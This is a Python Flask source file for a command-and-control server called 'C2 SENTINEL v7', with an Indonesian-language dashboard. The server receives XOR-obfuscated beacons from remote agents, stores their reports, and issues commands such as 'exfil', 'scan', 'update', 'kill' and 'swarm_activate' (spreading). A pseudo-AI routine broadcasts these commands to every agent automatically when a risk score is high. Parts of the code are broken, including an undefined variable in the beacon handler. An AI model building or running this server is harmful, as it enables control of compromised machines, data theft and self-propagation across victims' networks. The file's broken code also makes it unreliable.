from flask import Flask, request, jsonify, send_file, redirect, render_template_string
import json
import os
import base64
import threading
import time
from datetime import datetime, timedelta
import random
import math

# === CONFIG ===
XOR_KEY = os.getenv("XOR_KEY", "sentinel")
REPORT_FILE = "data/reports.json"
COMMAND_EXPIRY = 300
TELEGRAM_ENABLED = False

if not os.path.exists("data"):
    os.makedirs("data")
if not os.path.exists(REPORT_FILE):
    with open(REPORT_FILE, "w") as f:
        json.dump([], f)

# === STORAGE ===
ACTIVE_COMMANDS = {}
AGENT_LAST_SEEN = {}
AGENT_STATUS = {}
AGENT_CHECKINS = []
AGENT_SWARM_MAP = {}  # {agent_id: {"parent": ..., "children": [...], "ip": ...}}

# === UTILS ===
def xor_decrypt(data_b64, key=XOR_KEY):
    try:
        decoded = base64.b64decode(data_b64).decode()
        return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(decoded))
    except Exception as e:
        print(f"[XOR ERROR] {e}")
        return None

def is_high_severity(data):
    high_keywords = ["IDOR", "RCE", "SQLi", "XSS", "Auth Bypass", "SSRF", "LFI", "RFI"]
    issue = str(data.get("issue", "")).upper()
    return any(kw.upper() in issue for kw in high_keywords)

def send_alert(text):
    if not TELEGRAM_ENABLED:
        print("[TELEGRAM] Alert (nonaktif):", text)
        return
    pass

# === NEURAL AI ENGINE ===
def neural_ai_analyze(reports):
    """AI dengan prediksi & rekomendasi proaktif"""
    try:
        total = len(reports)
        if total == 0:
            return {
                "summary": "🧠 **NEURAL AI INSIGHT**\n========================\nBelum ada data. Deploy agent sekarang!\n\n🔮 Prediksi: Jaringanmu berpotensi terinfeksi dalam 72 jam tanpa pertahanan.\n\n🎯 Rekomendasi Proaktif:\n1. Jalankan agent di semua subnet\n2. Aktifkan mode 'swarm_activate'\n3. Pantau port 22 & 3389",
                "risk_score": 85,
                "prediction": "High risk of network compromise",
                "auto_command": "swarm_activate"
            }

        # Analisis tren
        now = datetime.now()
        last_hour = 0
        high_sev = 0
        unique_hosts = set()
        swarm_agents = 0

        for r in reports:
            if is_high_severity(r):
                high_sev += 1
            host = r.get("system", {}).get("hostname", "unknown")
            unique_hosts.add(host)
            if "swarm" in r.get("status", ""):
                swarm_agents += 1

            try:
                ts = datetime.fromisoformat(r.get("timestamp", ""))
                if (now - ts).total_seconds() < 3600:
                    last_hour += 1
            except:
                pass

        # Hitung risk score
        risk_score = min(100, high_sev * 10 + (total // 10) * 5)
        if swarm_agents > 5:
            risk_score = max(risk_score, 95)  # swarm = high risk

        # Prediksi
        if swarm_agents > 0:
            prediction = f"Agent swarm aktif → {swarm_agents} agent menyebar otomatis"
            auto_command = "idle"  # biarkan swarm bekerja
        elif last_hour < 3:
            prediction = "Aktivitas rendah → risiko serangan meningkat"
            auto_command = "scan"
        else:
            prediction = "Aktivitas normal → pertahankan vigilansi"
            auto_command = "idle"

        # Rekomendasi
        summary = f"""
🧠 **NEURAL AI INSIGHT**
========================
Total Agent: {len(unique_hosts)}
Laporan: {total} (High: {high_sev})
Agent Swarm: {swarm_agents}
Aktivitas 1 Jam: {last_hour}

🔮 Prediksi: {prediction}
⚠️ Risk Score: {risk_score}/100

🎯 Rekomendasi Proaktif:
- {random.choice([
    "Aktifkan 'swarm_activate' untuk pertahanan otomatis",
    "Fokuskan scan ke subnet dengan aktivitas rendah",
    "Update semua agent ke versi terbaru",
    "Periksa exfiltration di host yang jarang beacon"
])}
- Risk Score > 80? Segera isolasi jaringan!
        """

        return {
            "summary": summary.strip(),
            "risk_score": risk_score,
            "prediction": prediction,
            "auto_command": auto_command,
            "swarm_agents": swarm_agents
        }

    except Exception as e:
        print(f"[NEURAL AI ERROR] {e}")
        return {
            "summary": "❌ Neural AI error. Switch ke mode manual.",
            "risk_score": 0,
            "prediction": "Unknown",
            "auto_command": "idle"
        }

# === AUTO-COMMAND SYSTEM ===
def auto_command_system(ai_insight):
    """Server bisa kirim perintah otomatis ke agent jika risk score tinggi"""
    if ai_insight["risk_score"] > 75:
        cmd = ai_insight["auto_command"]
        if cmd != "idle":
            # Kirim ke SEMUA agent aktif
            for agent_id in AGENT_LAST_SEEN.keys():
                if agent_id not in ACTIVE_COMMANDS:  # jangan timpa perintah manual
                    ACTIVE_COMMANDS[agent_id] = {
                        "cmd": cmd,
                        "note": "AUTO: Neural AI Command",
                        "timestamp": datetime.now().isoformat(),
                        "issued_by": "neural_ai"
                    }
            print(f"[NEURAL AI] Auto-command '{cmd}' dikirim ke {len(AGENT_LAST_SEEN)} agent!")

# === TRACK CHECKINS ===
def track_agent_checkins():
    while True:
        now = datetime.now()
        minute_key = now.strftime("%H:%M")
        online_now = sum(1 for agent_id in AGENT_LAST_SEEN.keys()
                        if (now - AGENT_LAST_SEEN[agent_id]).total_seconds() < 300)
        AGENT_CHECKINS.append({"time": minute_key, "online": online_now})
        if len(AGENT_CHECKINS) > 60:
            AGENT_CHECKINS.pop(0)
        time.sleep(60)

threading.Thread(target=track_agent_checkins, daemon=True).start()

# === FLASK APP ===
app = Flask(__name__)

# === TEMPLATES ===
def get_dashboard_template():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>🌐 C2 SENTINEL v7 - NEURAL SWARM COMMAND CENTER</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js"></script>
        <style>
            body { 
                background: #000; 
                color: #00ff00; 
                font-family: 'Courier New', monospace; 
                padding: 0; 
                margin: 0;
                overflow-x: hidden;
                background: radial-gradient(circle, #001100, #000);
            }
            .container { 
                max-width: 1400px; 
                margin: auto; 
                padding: 20px;
                position: relative;
                z-index: 10;
            }
            h1, h2, h3 { 
                color: #00ff99; 
                text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
            }
            a { 
                color: #00ccff; 
                text-decoration: none; 
                text-shadow: 0 0 5px #00ccff;
            }
            a:hover { 
                text-decoration: underline; 
                filter: drop-shadow(0 0 8px #00ccff);
            }
            pre { 
                background: rgba(0, 20, 0, 0.8); 
                padding: 15px; 
                border-radius: 5px; 
                overflow-x: auto;
                border: 1px solid #00ff00;
                box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
            }
            .card { 
                background: rgba(0, 30, 0, 0.7); 
                padding: 20px; 
                margin: 15px 0; 
                border-radius: 8px; 
                border: 1px solid #00ff00;
                box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
                backdrop-filter: blur(5px);
            }
            .grid { 
                display: grid; 
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
                gap: 20px; 
            }
            .status-online { 
                color: #00ff00; 
                text-shadow: 0 0 5px #00ff00;
            }
            .status-offline { 
                color: #ff3333; 
                text-shadow: 0 0 5px #ff3333;
            }
            .blink { 
                animation: blinker 1.5s linear infinite; 
                text-shadow: 0 0 10px #ff0000;
            }
            @keyframes blinker { 
                50% { opacity: 0.3; }
            }
            button { 
                background: rgba(0, 50, 0, 0.8); 
                color: #00ff00; 
                border: 1px solid #00ff00; 
                padding: 10px 20px; 
                cursor: pointer;
                border-radius: 4px;
                font-weight: bold;
                text-shadow: 0 0 5px #00ff00;
                box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
            }
            button:hover { 
                background: rgba(0, 80, 0, 0.8);
                box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
            }
            select, input { 
                background: rgba(0, 30, 0, 0.8); 
                color: #00ff00; 
                border: 1px solid #00ff00; 
                padding: 10px;
                border-radius: 4px;
            }
            .header { 
                border-bottom: 2px solid #00ff00; 
                padding-bottom: 10px; 
                margin-bottom: 20px;
                text-align: center;
            }
            .terminal { 
                height: 400px; 
                overflow-y: auto; 
                background: rgba(0, 10, 0, 0.9); 
                padding: 15px;
                border: 1px solid #00ff00;
                border-radius: 5px;
                box-shadow: inset 0 0 10px rgba(0, 255, 0, 0.3);
            }
            .ai-insight { 
                background: rgba(0, 40, 0, 0.9); 
                border-left: 4px solid #ff00ff; 
                padding: 20px; 
                margin: 20px 0;
                border-radius: 5px;
                box-shadow: 0 0 15px rgba(255, 0, 255, 0.3);
            }
            .chart-container { 
                height: 300px; 
                margin: 20px 0; 
                background: rgba(0, 20, 0, 0.5);
                border-radius: 8px;
                padding: 10px;
            }
            .swarm-map { 
                height: 400px; 
                background: rgba(0, 10, 0, 0.8);
                border: 1px solid #00ff00;
                border-radius: 8px;
                position: relative;
            }
            .matrix-rain {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none;
                z-index: 1;
                opacity: 0.1;
            }
            .neon-title {
                font-size: 2.5em;
                font-weight: bold;
                letter-spacing: 3px;
                text-transform: uppercase;
                background: linear-gradient(90deg, #00ff00, #00ffff, #ff00ff);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                text-fill-color: transparent;
                animation: glow 2s ease-in-out infinite alternate;
            }
            @keyframes glow {
                from { text-shadow: 0 0 10px #00ff00; }
                to { text-shadow: 0 0 20px #00ffff, 0 0 30px #ff00ff; }
            }
            .cyberpunk-loader {
                width: 50px;
                height: 50px;
                border: 4px solid transparent;
                border-top: 4px solid #00ff00;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
        <div class="matrix-rain" id="matrixRain"></div>
        
        <div class="container">
            <div class="header">
                <h1 class="neon-title">🌐 C2 SENTINEL v7</h1>
                <h3><span class="blink">[NEURAL SWARM COMMAND CENTER]</span></h3>
                <p>
                    <a href="/">🏠 Dashboard</a> |
                    <a href="/agents">👾 Agent Live</a> |
                    <a href="/command">🎯 Command Center</a> |
                    <a href="/reports">📁 Reports</a> |
                    <a href="/logs">📜 Live Logs</a> |
                    <a href="/analytics">🤖 AI Analytics</a> |
                    <a href="/swarm">🕸️ Swarm Map</a>
                </p>
            </div>

            <!-- CONTENT -->
            {{ content | safe }}

            <footer style="margin-top: 50px; font-size: 0.8em; color: #555; text-align: center;">
                C2 Sentinel v7 - NEURAL SWARM EDITION &copy; 2025 | 
                <span class="status-{{ 'online' if agents_online > 0 else 'offline' }}">Agents: {{ agents_online }} Online</span> |
                <span style="color: #ff00ff;">Neural AI: {{ 'ACTIVE' if neural_active else 'STANDBY' }}</span>
            </footer>
        </div>

        <script>
            // Matrix Rain Effect
            const matrix = document.getElementById('matrixRain');
            const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789';
            const fontSize = 14;
            const columns = window.innerWidth / fontSize;
            const drops = [];

            for (let i = 0; i < columns; i++) {
                drops[i] = 1;
            }

            function draw() {
                matrix.innerHTML = '';
                for (let i = 0; i < drops.length; i++) {
                    const text = chars.charAt(Math.floor(Math.random() * chars.length));
                    const x = i * fontSize;
                    const y = drops[i] * fontSize;
                    matrix.innerHTML += `<div style="position: absolute; color: #00ff00; font-size: ${fontSize}px; top: ${y}px; left: ${x}px;">${text}</div>`;
                    if (Math.random() > 0.98 && drops[i] > 10) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }
            setInterval(draw, 50);

            // Auto-refresh
            setInterval(() => {
                if(['/logs', '/agents', '/', '/swarm'].includes(window.location.pathname)) {
                    location.reload();
                }
            }, 5000);
        </script>
    </body>
    </html>
    '''

# === ROUTES ===
@app.route('/')
def home():
    now = datetime.now()
    online_count = 0
    for agent_id, last_seen in AGENT_LAST_SEEN.items():
        if (now - last_seen).total_seconds() < 300:
            AGENT_STATUS[agent_id] = "online"
            online_count += 1
        else:
            AGENT_STATUS[agent_id] = "offline"

    # Load & analyze with NEURAL AI
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        if not isinstance(reports, list):
            reports = []
    except:
        reports = []

    ai_insight = neural_ai_analyze(reports)
    
    # Trigger auto-command if needed
    if ai_insight["risk_score"] > 75:
        auto_command_system(ai_insight)

    # Prepare chart data
    chart_labels = [item["time"] for item in AGENT_CHECKINS]
    chart_data = [item["online"] for item in AGENT_CHECKINS]

    content = f'''
    <div class="ai-insight">
        <h3>🧠 NEURAL AI INSIGHT — PREDIKSI & OTOMASI</h3>
        <pre style="color:#ff00ff; white-space: pre-wrap; font-weight: bold;">{ai_insight["summary"]}</pre>
        <p style="color: #ffff00; font-weight: bold;">⚠️ AUTO-COMMAND: <span style="color: #00ff00;">{ai_insight["auto_command"].upper()}</span> (Risk Score: {ai_insight["risk_score"]}/100)</p>
    </div>

    <div class="grid">
        <div class="card">
            <h2>📊 Statistik Real-time</h2>
            <p>🟢 Agent Online: <b>{online_count}</b></p>
            <p>💾 Total Laporan: <b>{len(reports)}</b></p>
            <p>🚨 High Severity: <b>{sum(1 for r in reports if is_high_severity(r))}</b></p>
            <p>🕸️ Agent Swarm: <b>{ai_insight.get("swarm_agents", 0)}</b></p>
            <p>⏱️ Command Aktif: <b>{len(ACTIVE_COMMANDS)}</b></p>
        </div>
        <div class="card">
            <h2>🚀 Quick Actions</h2>
            <p><a href="/command"><button>🎯 Kirim Perintah</button></a></p>
            <p><a href="/agents"><button>👾 Lihat Agent Live</button></a></p>
            <p><a href="/swarm"><button>🕸️ Swarm Visualization</button></a></p>
        </div>
    </div>

    <div class="card">
        <h2>📈 Grafik Agent Online (60 Menit Terakhir)</h2>
        <div class="chart-container">
            <canvas id="agentChart"></canvas>
        </div>
    </div>

    <div class="card">
        <h2>📡 Agent Terakhir Check-in</h2>
        <pre>
{chr(10).join([f"[{last_seen.strftime('%H:%M:%S')}] {agent_id} - {AGENT_STATUS.get(agent_id, 'unknown')}" for agent_id, last_seen in list(AGENT_LAST_SEEN.items())[-5:]]) or "Belum ada agent check-in."}
        </pre>
    </div>

    <script>
        const ctx = document.getElementById('agentChart').getContext('2d');
        new Chart(ctx, {{
            type: 'line',
             {{
                labels: {json.dumps(chart_labels)},
                datasets: [{{
                    label: 'Agent Online',
                     {json.dumps(chart_data)},
                    borderColor: '#00ff00',
                    backgroundColor: 'rgba(0, 255, 0, 0.1)',
                    tension: 0.4,
                    pointBackgroundColor: '#ff00ff'
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{
                        labels: {{
                            color: '#00ff00'
                        }}
                    }}
                }},
                scales: {{
                    x: {{
                        ticks: {{ color: '#00ff00' }}
                    }},
                    y: {{
                        beginAtZero: true,
                        ticks: {{ color: '#00ff00' }}
                    }}
                }}
            }}
        }});
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=online_count, neural_active=True)

@app.route('/swarm')
def swarm_map():
    """Visualisasi 3D penyebaran agent"""
    # Bangun struktur genealogy
    nodes = []
    links = []
    agent_list = list(AGENT_LAST_SEEN.keys())
    
    for i, agent_id in enumerate(agent_list[:50]):  # batasi 50 agent
        status = "online" if (datetime.now() - AGENT_LAST_SEEN[agent_id]).total_seconds() < 300 else "offline"
        nodes.append({
            "id": agent_id,
            "name": agent_id,
            "status": status,
            "group": 1,
            "x": random.uniform(-100, 100),
            "y": random.uniform(-100, 100),
            "z": random.uniform(-100, 100)
        })
        
        # Buat link ke "parent" acak (simulasi)
        if i > 0:
            parent_id = agent_list[random.randint(0, i-1)]
            links.append({
                "source": agent_list.index(parent_id),
                "target": i,
                "value": 1
            })

    content = f'''
    <h2>🕸️ NEURAL SWARM 3D MAP</h2>
    <div class="card">
        <div class="swarm-map" id="swarmMap"></div>
        <p><small>Visualisasi 3D agent dan koneksi penyebarannya. Auto-refresh tiap 5 detik.</small></p>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/controls/OrbitControls.js"></script>
    <script>
        // Simple 3D visualization with Three.js
        const container = document.getElementById('swarmMap');
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, container.clientWidth / container.clientHeight, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer({ antialias: true });
        renderer.setSize(container.clientWidth, container.clientHeight);
        renderer.setClearColor(0x000000);
        container.appendChild(renderer.domElement);

        // Add lights
        const ambientLight = new THREE.AmbientLight(0x404040);
        scene.add(ambientLight);
        const directionalLight = new THREE.DirectionalLight(0x00ff00, 1);
        directionalLight.position.set(1, 1, 1);
        scene.add(directionalLight);

        // Add agents as spheres
        const nodes = {json.dumps(nodes)};
        const links = {json.dumps(links)};
        const spheres = [];

        nodes.forEach((node, i) => {{
            const geometry = new THREE.SphereGeometry(3, 32, 32);
            const material = new THREE.MeshBasicMaterial({{ 
                color: node.status === 'online' ? 0x00ff00 : 0xff0000,
                transparent: true,
                opacity: 0.8
            }});
            const sphere = new THREE.Mesh(geometry, material);
            sphere.position.set(node.x, node.y, node.z);
            scene.add(sphere);
            spheres.push(sphere);
        }});

        // Add links
        links.forEach(link => {{
            const start = spheres[link.source].position;
            const end = spheres[link.target].position;
            const geometry = new THREE.BufferGeometry().setFromPoints([start, end]);
            const material = new THREE.LineBasicMaterial({{ color: 0x00ffff }});
            const line = new THREE.Line(geometry, material);
            scene.add(line);
        }});

        camera.position.z = 200;

        // Add orbit controls
        const controls = new THREE.OrbitControls(camera, renderer.domElement);
        controls.enableDamping = true;
        controls.dampingFactor = 0.25;

        function animate() {{
            requestAnimationFrame(animate);
            controls.update();
            renderer.render(scene, camera);
        }}
        animate();

        // Resize handler
        window.addEventListener('resize', () => {{
            camera.aspect = container.clientWidth / container.clientHeight;
            camera.updateProjectionMatrix();
            renderer.setSize(container.clientWidth, container.clientHeight);
        }});
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True)

@app.route('/agents')
def agents_live():
    now = datetime.now()
    agents_html = ""
    for agent_id in AGENT_LAST_SEEN.keys():
        last_seen = AGENT_LAST_SEEN[agent_id]
        status = "online" if (now - last_seen).total_seconds() < 300 else "offline"
        AGENT_STATUS[agent_id] = status
        time_str = last_seen.strftime("%Y-%m-%d %H:%M:%S")
        agents_html += f'''
        <div style="border-bottom: 1px solid #333; padding: 10px;">
            <b>{agent_id}</b> 
            <span class="status-{status}">● {status.upper()}</span>
            <br><small>Terakhir: {time_str}</small>
            <br><a href="/command?agent_id={agent_id}"><button>Kirim Perintah</button></a>
        </div>
        '''

    content = f'''
    <h2>👾 AGENT LIVE STATUS</h2>
    <div style="background: rgba(0, 30, 0, 0.7); padding:15px; border-radius:5px;">
        {agents_html if agents_html else "<i>Tidak ada agent terdaftar.</i>"}
    </div>
    <p><small>Auto-refresh tiap 5 detik...</small></p>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True)

@app.route('/command', methods=['GET', 'POST'])
def command_panel():
    if request.method == 'POST':
        agent_id = request.form.get('agent_id')
        cmd = request.form.get('cmd')
        note = request.form.get('note', '')
        if agent_id and cmd:
            ACTIVE_COMMANDS[agent_id] = {
                "cmd": cmd,
                "note": note,
                "timestamp": datetime.now().isoformat(),
                "issued_by": "admin"
            }
            return f'''
            <script>
                alert("✅ Perintah '{cmd}' terkirim ke {agent_id}!");
                window.location.href="/command";
            </script>
            '''

    prefill_id = request.args.get('agent_id', '')
    commands_html = ""
    for aid, cmd in ACTIVE_COMMANDS.items():
        issued = datetime.fromisoformat(cmd["timestamp"]).strftime("%H:%M:%S")
        commands_html += f"<li><b>{aid}</b>: <code>{cmd['cmd']}</code> ({issued}) <i>{cmd.get('note','')}</i></li>"

    content = f'''
    <h2>🎯 COMMAND CENTER</h2>
    <form method="post">
        <label>🆔 Agent ID:</label><br>
        <input type="text" name="agent_id" value="{prefill_id}" required style="width:100%; max-width:400px; background: rgba(0,30,0,0.8); color: #00ff00;"><br><br>
        
        <label>🕹️ Perintah:</label><br>
        <select name="cmd" style="width:100%; max-width:400px; background: rgba(0,30,0,0.8); color: #00ff00;">
            <option value="idle">🔄 idle - Tunggu perintah</option>
            <option value="scan">🔍 scan - Scan jaringan</option>
            <option value="exfil">📤 exfil - Kumpulkan data</option>
            <option value="update">🆙 update - Update agent</option>
            <option value="kill">💀 kill - Matikan agent</option>
            <option value="swarm_activate">🕸️ swarm_activate - Aktifkan penyebaran</option>
        </select><br><br>
        
        <label>📝 Catatan (Opsional):</label><br>
        <input type="text" name="note" placeholder="Contoh: fokus ke subnet 192.168.2.0" style="width:100%; max-width:400px; background: rgba(0,30,0,0.8); color: #00ff00;"><br><br>
        
        <button type="submit">🚀 KIRIM PERINTAH</button>
    </form>
    
    <h3>📌 PERINTAH AKTIF (Auto-expire 5 menit)</h3>
    <ul>{commands_html if commands_html else "<i>Tidak ada perintah aktif.</i>"}</ul>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True)

@app.route('/reports')
def list_reports():
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        reports.reverse()

        export_links = '''
        <p>
            <a href="/export?format=json"><button>💾 Export JSON</button></a>
            <a href="/export?format=csv"><button>📊 Export CSV</button></a>
        </p>
        '''

        content = f'''
        <h2>📁 LAPORAN AGENT</h2>
        {export_links}
        <div class="terminal" id="reportTerminal">
            <pre id="reportContent" style="color:#00ff00;">{json.dumps(reports[:50], indent=2, ensure_ascii=False) if reports else "Belum ada laporan."}</pre>
        </div>
        {export_links}
        '''
        return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True)
    except Exception as e:
        return f"<h2>❌ Error</h2><pre>{e}</pre>"

@app.route('/export')
def export_reports():
    fmt = request.args.get('format', 'json')
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        if fmt == 'csv':
            import csv
            from io import StringIO
            output = StringIO()
            writer = csv.writer(output)
            if reports:
                writer.writerow(reports[0].keys())
                for r in reports:
                    writer.writerow(r.values())
            output.seek(0)
            return output.getvalue(), 200, {
                'Content-Type': 'text/csv',
                'Content-Disposition': 'attachment; filename=reports.csv'
            }
        else:
            return jsonify(reports)
    except Exception as e:
        return str(e), 500

@app.route('/logs')
def live_logs():
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        reports.reverse()
        logs = []
        for r in reports[:100]:
            ts = r.get("timestamp", "N/A")
            agent = r.get("id", "unknown")
            issue = r.get("issue", "N/A")
            severity = "🔴 HIGH" if is_high_severity(r) else "⚪ LOW"
            logs.append(f"[{ts}] [{agent}] {severity} | {issue}")

        content = f'''
        <h2>📜 LIVE LOGS (Auto-refresh)</h2>
        <div class="terminal" id="logTerminal">
            <pre id="logContent" style="color:#00ff00;">
{chr(10).join(logs) if logs else "Belum ada log."}
            </pre>
        </div>
        <p><small>Auto-refresh tiap 5 detik...</small></p>
        '''
        return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True)
    except Exception as e:
        return str(e)

@app.route('/beacon', methods=['POST'])
def beacon():
    encrypted_data = request.form.get('data')
    if not encrypted:  # ← PERBAIKAN UTAMA: sebelumnya "encrypted_"
        return "Invalid", 400

    decrypted = xor_decrypt(encrypted_data)
    if not decrypted:
        return "Forbidden", 403

    try:
        data = json.loads(decrypted)
        agent_id = data.get("id", "unknown")
        data["timestamp"] = datetime.now().isoformat()
        data["beacon_ip"] = request.remote_addr

        # Update last seen & swarm map
        AGENT_LAST_SEEN[agent_id] = datetime.now()
        
        # Simpan ke swarm map (simulasi genealogy)
        if agent_id not in AGENT_SWARM_MAP:
            # Cari "parent" acak dari agent yang sudah ada
            existing_agents = list(AGENT_SWARM_MAP.keys())
            parent = random.choice(existing_agents) if existing_agents else "ROOT"
            AGENT_SWARM_MAP[agent_id] = {
                "parent": parent,
                "children": [],
                "ip": data.get("ip", "unknown"),
                "first_seen": data["timestamp"]
            }
            if parent != "ROOT" and parent in AGENT_SWARM_MAP:
                AGENT_SWARM_MAP[parent]["children"].append(agent_id)

        # Simpan laporan
        with open(REPORT_FILE, "r+") as f:
            try:
                reports = json.load(f)
                if not isinstance(reports, list):
                    reports = []
            except:
                reports = []
            reports.append(data)
            f.seek(0)
            json.dump(reports, f, indent=2, ensure_ascii=False)
            f.truncate()

        # AI Filter & Alert
        if is_high_severity(data):
            alert = f"🚨 <b>BUG KRITIS DITEMUKAN!</b>\n"
            alert += f"🆔 Agent: {agent_id}\n"
            alert += f"🎯 Target: {data.get('target', 'unknown')}\n"
            alert += f"🔧 Issue: {data.get('issue', 'unknown')}\n"
            alert += f"💰 Potensi Bounty: HIGH\n"
            alert += f"🕒 Waktu: {data['timestamp']}"
            send_alert(alert)

        # Kirim perintah
        cmd = ACTIVE_COMMANDS.get(agent_id, {"cmd": "idle"})
        if agent_id in ACTIVE_COMMANDS:
            del ACTIVE_COMMANDS[agent_id]

        return jsonify(cmd)

    except Exception as e:
        print(f"[BEACON ERROR] {e}")
        return "Error", 500

@app.route('/update', methods=['GET'])
def update():
    update_file = "agent_new.py"
    if not os.path.exists(update_file):
        with open(update_file, "w") as f:
            f.write('''print("✅ Agent updated to v4.0 - NEURAL SWARM EDITION!")\n''')
    return send_file(update_file)

@app.route('/analytics')
def analytics():
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        if not isinstance(reports, list):
            reports = []
    except:
        reports = []

    ai_insight = neural_ai_analyze(reports)

    issue_labels = list(set(r.get("issue", "Unknown") for r in reports[:50]))
    issue_data = [sum(1 for r in reports if r.get("issue") == label) for label in issue_labels]

    target_labels = list(set(r.get("target", "Unknown") for r in reports[:50]))
    target_data = [sum(1 for r in reports if r.get("target") == label) for label in target_labels]

    chart_labels = [item["time"] for item in AGENT_CHECKINS]
    chart_data = [item["online"] for item in AGENT_CHECKINS]

    content = f'''
    <h2>📈 NEURAL ANALYTICS & PREDICTION</h2>

    <div class="ai-insight">
        <h3>🧠 NEURAL AI EXECUTIVE SUMMARY</h3>
        <pre style="color:#ff00ff; white-space: pre-wrap; font-weight: bold;">{ai_insight["summary"]}</pre>
        <p style="color: #ffff00; font-weight: bold;">🔮 PREDIKSI: {ai_insight["prediction"]}</p>
    </div>

    <div class="grid">
        <div class="card">
            <h3>📊 Issue Types Distribution</h3>
            <div class="chart-container">
                <canvas id="issueChart"></canvas>
            </div>
        </div>
        <div class="card">
            <h3>🎯 Top Targets</h3>
            <div class="chart-container">
                <canvas id="targetChart"></canvas>
            </div>
        </div>
    </div>

    <div class="card">
        <h3>📈 Agent Online Trend (60 Menit)</h3>
        <div class="chart-container">
            <canvas id="agentTrendChart"></canvas>
        </div>
    </div>

    <script>
        const issueCtx = document.getElementById('issueChart').getContext('2d');
        new Chart(issueCtx, {{
            type: 'bar',
             {{
                labels: {json.dumps(issue_labels)},
                datasets: [{{
                     {json.dumps(issue_data)},
                    backgroundColor: 'rgba(0, 255, 0, 0.5)',
                    borderColor: '#00ff00',
                    borderWidth: 1
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{ labels: {{ color: '#00ff00' }} }}
                }},
                scales: {{
                    x: {{ ticks: {{ color: '#00ff00' }} }},
                    y: {{ beginAtZero: true, ticks: {{ color: '#00ff00' }} }}
                }}
            }}
        }});

        const targetCtx = document.getElementById('targetChart').getContext('2d');
        new Chart(targetCtx, {{
            type: 'pie',
             {{
                labels: {json.dumps(target_labels)},
                datasets: [{{
                     {json.dumps(target_data)},
                    backgroundColor: [
                        'rgba(0, 255, 0, 0.7)',
                        'rgba(0, 200, 0, 0.7)',
                        'rgba(0, 150, 0, 0.7)',
                        'rgba(0, 100, 0, 0.7)',
                        'rgba(0, 50, 0, 0.7)',
                        'rgba(0, 255, 50, 0.7)',
                        'rgba(0, 255, 100, 0.7)',
                        'rgba(0, 255, 150, 0.7)',
                        'rgba(0, 255, 200, 0.7)',
                        'rgba(0, 255, 255, 0.7)'
                    ]
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{ labels: {{ color: '#00ff00' }} }}
                }}
            }}
        }});

        const trendCtx = document.getElementById('agentTrendChart').getContext('2d');
        new Chart(trendCtx, {{
            type: 'line',
             {{
                labels: {json.dumps(chart_labels)},
                datasets: [{{
                    label: 'Agent Online',
                     {json.dumps(chart_data)},
                    borderColor: '#00ff00',
                    backgroundColor: 'rgba(0, 255, 0, 0.1)',
                    tension: 0.3
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{ labels: {{ color: '#00ff00' }} }}
                }},
                scales: {{
                    x: {{ ticks: {{ color: '#00ff00' }} }},
                    y: {{ beginAtZero: true, ticks: {{ color: '#00ff00' }} }}
                }}
            }}
        }});
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True)

# === RUN ===
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8000))
    print("🚀 C2 SENTINEL v7 - NEURAL SWARM COMMAND CENTER")
    print(f"🌐 Running on http://0.0.0.0:{port}")
    print("🔐 XOR Key: 'sentinel'")
    app.run(host='0.0.0.0', port=port, debug=False)